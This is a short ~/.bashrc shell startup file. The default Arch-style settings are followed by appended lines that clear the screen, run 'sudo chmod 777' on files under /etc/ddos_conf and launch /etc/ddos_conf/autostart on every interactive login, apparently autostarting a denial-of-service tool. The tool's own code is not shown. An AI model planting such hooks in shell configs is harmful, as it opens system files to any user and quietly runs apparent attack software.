#
# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'
PS1='[\u@\h \W]\$ '

clear 
sudo chmod 777 /etc/ddos_conf/*
/etc/ddos_conf/autostart


